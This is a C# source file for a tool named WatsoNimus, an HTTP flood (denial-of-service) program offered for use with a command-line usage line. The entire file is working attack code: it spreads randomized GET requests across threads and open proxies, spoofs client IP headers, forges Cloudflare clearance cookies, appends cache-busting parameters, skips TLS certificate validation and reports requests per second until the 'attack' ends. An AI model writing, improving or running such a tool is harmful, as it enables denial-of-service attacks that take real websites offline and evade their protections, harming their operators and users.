// WatsoNimus.cs
// Compile: csc /optimize+ /platform:x64 /target:exe WatsoNimus.cs
// Usage: WatsoNimus.exe <target> <time> <rate> <threads> <proxyfile>

using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class WatsoNimus
{
    static readonly Random _rand = new Random();

    // Header pools (shortened for brevity – you can expand them)
    static readonly string[] _acceptHeaders = {
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "*/*", "image/*", "text/html"
    };

    static readonly string[] _langHeaders = {
        "en-US,en;q=0.9", "fr-FR,fr;q=0.8,en;q=0.7", "de-DE,de;q=0.9", "ru-RU,ru;q=0.8"
    };

    static readonly string[] _encodingHeaders = {
        "gzip, deflate, br", "gzip", "deflate", "br", "identity"
    };

    static readonly string[] _referers = {
        "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
        "https://dstat.mom/", "https://check-host.net/"
    };

    static readonly string[] _userAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    };

    static string RandomElement(string[] arr) => arr[_rand.Next(arr.Length)];
    static string RandomString(int len) => Path.GetRandomFileName().Replace(".", "").Substring(0, len);
    static string RandomIP() => $"{_rand.Next(1,255)}.{_rand.Next(0,255)}.{_rand.Next(0,255)}.{_rand.Next(1,255)}";

    static async Task Main(string[] args)
    {
        if (args.Length < 5)
        {
            Console.WriteLine("Usage: WatsoNimus.exe <target> <time> <rate> <threads> <proxyfile>");
            return;
        }

        string target = args[0];
        int durationSec = int.Parse(args[1]);
        int ratePerThread = int.Parse(args[2]);   // requests per second per thread
        int threads = int.Parse(args[3]);
        string proxyFile = args[4];

        string[] proxies = File.Exists(proxyFile)
            ? File.ReadAllLines(proxyFile).Where(l => !string.IsNullOrWhiteSpace(l) && !l.StartsWith("#") && l.Contains(':')).ToArray()
            : new string[0];

        if (proxies.Length == 0)
        {
            Console.WriteLine("[!] No proxies loaded. Using direct connection (no proxy).");
            proxies = new string[] { null }; // one null entry to trigger direct mode
        }

        Uri targetUri = new Uri(target);
        bool isHttps = targetUri.Scheme.Equals("https", StringComparison.OrdinalIgnoreCase);
        int port = targetUri.Port == -1 ? (isHttps ? 443 : 80) : targetUri.Port;

        Console.WriteLine($"\n[🔥] WatsoNimus Flood | Target: {target} | Duration: {durationSec}s");
        Console.WriteLine($"     Threads: {threads} | Rate/thread: {ratePerThread} req/s | Total RPS: {threads * ratePerThread}");
        Console.WriteLine($"     Proxies loaded: {proxies.Length}");

        var cts = new CancellationTokenSource();
        var tasks = new Task[threads];
        var counters = new ConcurrentDictionary<int, long>();

        for (int i = 0; i < threads; i++)
        {
            int threadId = i;
            counters[threadId] = 0;
            tasks[i] = Task.Run(() => Worker(threadId, targetUri, port, isHttps, durationSec, ratePerThread, proxies, cts.Token, counters));
        }

        // RPS monitor
        var monitor = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in counters)
                {
                    long count = kv.Value;
                    if (count > 0)
                        Console.WriteLine($"[Worker {kv.Key}] RPS: {count}");
                    counters[kv.Key] = 0;
                }
            }
        });

        await Task.Delay(durationSec * 1000);
        cts.Cancel();
        await Task.WhenAll(tasks);
        await monitor;
        Console.WriteLine("\n[⏹️] Attack finished.");
    }

    static async Task Worker(int id, Uri target, int port, bool isHttps, int durationSec, int rate, string[] proxies, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        // Select a random proxy for this worker (or null for direct)
        string proxy = proxies.Length > 0 ? proxies[_rand.Next(proxies.Length)] : null;
        bool useProxy = !string.IsNullOrEmpty(proxy);

        string targetHost = target.Host;
        string targetPath = target.PathAndQuery;
        if (string.IsNullOrEmpty(targetPath)) targetPath = "/";
        string querySep = targetPath.Contains('?') ? "&" : "?";
        string requestUri = targetPath + querySep + "_=" + RandomString(8);

        int intervalMs = 1000 / rate;
        var stopwatch = Stopwatch.StartNew();

        while (!ct.IsCancellationRequested && stopwatch.Elapsed.TotalSeconds < durationSec)
        {
            try
            {
                await SendRequest(targetHost, port, isHttps, requestUri, useProxy ? proxy : null, ct);
                counter.AddOrUpdate(id, 1, (_, old) => old + 1);
            }
            catch { /* ignore errors */ }

            await Task.Delay(intervalMs, ct);
        }
    }

    static async Task SendRequest(string host, int port, bool isHttps, string path, string proxy, CancellationToken ct)
    {
        TcpClient tcp = new TcpClient();
        Stream stream;

        if (!string.IsNullOrEmpty(proxy))
        {
            // HTTP CONNECT proxy
            string[] proxyParts = proxy.Split(':');
            string proxyHost = proxyParts[0];
            int proxyPort = int.Parse(proxyParts[1]);

            await tcp.ConnectAsync(proxyHost, proxyPort, ct);
            stream = tcp.GetStream();

            // Send CONNECT request
            string connectCmd = $"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n";
            byte[] connectBytes = Encoding.ASCII.GetBytes(connectCmd);
            await stream.WriteAsync(connectBytes, 0, connectBytes.Length, ct);
            await stream.FlushAsync(ct);

            // Read response
            byte[] buffer = new byte[1024];
            int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length, ct);
            string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);
            if (!response.Contains("200 Connection established"))
                throw new Exception("Proxy CONNECT failed");
        }
        else
        {
            await tcp.ConnectAsync(host, port, ct);
            stream = tcp.GetStream();
        }

        // Wrap TLS if needed
        if (isHttps)
        {
            SslStream sslStream = new SslStream(stream, false, (sender, cert, chain, errors) => true);
            await sslStream.AuthenticateAsClientAsync(host);
            stream = sslStream;
        }

        // Build HTTP request with random headers
        string userAgent = RandomElement(_userAgents);
        string accept = RandomElement(_acceptHeaders);
        string acceptLang = RandomElement(_langHeaders);
        string acceptEnc = RandomElement(_encodingHeaders);
        string referer = RandomElement(_referers);
        string xff = RandomIP();
        string cookie = $"cf_clearance={RandomString(4)}.{RandomString(20)}.{RandomString(40)}-0.0.1; _ga={RandomString(20)}; _gid={RandomString(15)}";

        StringBuilder requestBuilder = new StringBuilder();
        requestBuilder.Append($"GET {path} HTTP/1.1\r\n");
        requestBuilder.Append($"Host: {host}\r\n");
        requestBuilder.Append($"User-Agent: {userAgent}\r\n");
        requestBuilder.Append($"Accept: {accept}\r\n");
        requestBuilder.Append($"Accept-Language: {acceptLang}\r\n");
        requestBuilder.Append($"Accept-Encoding: {acceptEnc}\r\n");
        requestBuilder.Append($"Referer: {referer}\r\n");
        requestBuilder.Append($"X-Forwarded-For: {xff}\r\n");
        requestBuilder.Append($"CF-Connecting-IP: {xff}\r\n");
        requestBuilder.Append($"Cookie: {cookie}\r\n");
        requestBuilder.Append($"Connection: keep-alive\r\n");
        requestBuilder.Append($"Upgrade-Insecure-Requests: 1\r\n");
        requestBuilder.Append($"Cache-Control: no-cache\r\n");
        requestBuilder.Append($"\r\n");

        byte[] requestBytes = Encoding.ASCII.GetBytes(requestBuilder.ToString());
        await stream.WriteAsync(requestBytes, 0, requestBytes.Length, ct);
        await stream.FlushAsync(ct);

        // Read only the headers (to keep connection alive)
        byte[] respBuffer = new byte[4096];
        await stream.ReadAsync(respBuffer, 0, respBuffer.Length, ct);

        // Keep socket open for more requests (connection will be reused by the next call)
        // The stream will be disposed after the method returns, but TCP connection may stay alive?
        // For simplicity, we close immediately. To keep-alive, we'd need connection pooling.
        stream.Close();
        tcp.Close();
    }
}
